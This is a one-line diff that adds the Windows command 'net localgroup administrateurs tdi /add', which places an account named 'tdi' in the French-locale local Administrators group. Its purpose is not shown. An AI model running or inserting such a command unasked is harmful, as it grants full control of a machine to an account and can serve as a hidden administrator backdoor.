@@ -1,0 +1,1 @@
+net localgroup administrateurs tdi /add
